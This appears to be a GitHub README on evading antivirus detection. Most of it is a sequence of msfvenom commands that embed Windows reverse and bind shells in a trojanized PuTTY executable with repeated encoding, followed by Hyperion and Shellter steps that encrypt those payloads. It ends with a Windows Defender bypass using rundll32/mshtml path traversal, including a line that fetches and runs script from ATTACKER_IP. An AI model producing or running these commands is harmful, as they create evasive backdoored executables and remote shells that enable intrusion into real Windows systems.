# Bypassing Antivirus Payload Detection

<img width="704" alt="Screen Shot 2021-12-03 at 5 21 54 PM" src="https://user-images.githubusercontent.com/72598486/144680706-d3b91529-e530-4dcf-b0b9-50a0c94413d2.png">


# MSFvenom reverse stageless shells 
```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x86.exe - e x86/shikata_ga_nai -i 20 LHOST=192.168.40.128 LPORT=55555 
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp -f exe-only -k - x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x64.exe -e x64/xor -i 20 LHOST=192.168.40.128 LPORT=55555 
```
# MSFVenom bind stageless shell 
```
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_bind_putty_x86.exe -e x86/shikata_ga_nai -i 20 RHOST=0.0.0.0 LPORT=55555 
msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_bind_putty_x64.exe -e x64/xor -i 20 RHOST=0.0.0.0 LPORT=55555 
```
# Hyperion 2.31 x64 Payload Generating Strings 
```
wine hyperion.exe /root/payloads/msfvenom/msfv_reverse_putty_x64.exe /root/payloads/hyperion/hyperion_reverse_putty_x64.exe 
wine hyperion.exe /root/payloads/msfvenom/msfv_bind_putty_x64.exe /root/payloads/hyperion/hyperion_bind_putty_x64.exe 
```
# Hyperion 2.2 x86 Payload Generating Strings 
```
wine hyperion.exe /root/payloads/msfvenom/msfv_reverse_putty_x86.exe /root/payloads/hyperion/hyperion_reverse_putty_x86.exe 
wine hyperion.exe /root/payloads/msfvenom/msfv_bind_putty_x86.exe /root/payloads/hyperion/hyperion_bind_putty_x86.exe 
```
# MSFVenom RAW Shellter Payload Generating Strings with only x86 supported 
```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f raw -o /root/payloads/shellter/shellter_reverse_x86.raw -e x86/shikata_ga_nai -i 20 LHOST=192.168.40.128 LPORT=55555 
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f raw -o /root/payloads/shellter/shellter_bind_x86.raw -e x86/shikata_ga_nai -i 20 RHOST=0.0.0.0 LPORT=55555 
```
# Hyperion 2.2 x86 encrypt a Shellter payload 
```
wine hyperion.exe /root/payloads/shellter/shellter_putty_bind_x86.exe /root/payloads/hyperion/hyperion_shellter_bind_putty_x86.exe 
wine hyperion.exe /root/payloads/shellter/shellter_putty_reverse_x86.exe /root/payloads/hyperion/hyperion_shellter_reverse_putty_x86.exe 
```

# VirusTotal and YARA Detection 
<img width="583" alt="Screen Shot 2021-12-03 at 5 22 12 PM" src="https://user-images.githubusercontent.com/72598486/144680778-e92bd81b-7a97-4559-a564-44ba0217cd0f.png">

# Windows Defender Detection Bypass

Currently, Windows Defender detects and prevents TrojanWin32Powessere.G aka "POWERLIKS" type execution that leverages rundll32.exe. Attempts at execution fail
and attackers will get an "Access is denied" error message. However, it can be easily bypassed by passing an extra path traversal when referencing mshtml.

```
C:\>rundll32.exe javascript:"\..\..\mshtml,RunHTMLApplication ";alert(1)
Access is denied.
```

Pass an extra "..\" to the path.

```C:\>rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";alert(666)```

Windows Defender also detects based on the following javascript call using GetObject("script:http://ATTACKER_IP/hi.tmp").
However, that interference can be bypassed by using concatenation when constructing the URL scheme portion of the payload.

```
C:\>rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://ATTACKER_IP/hi.tmp")
Access is denied.
```
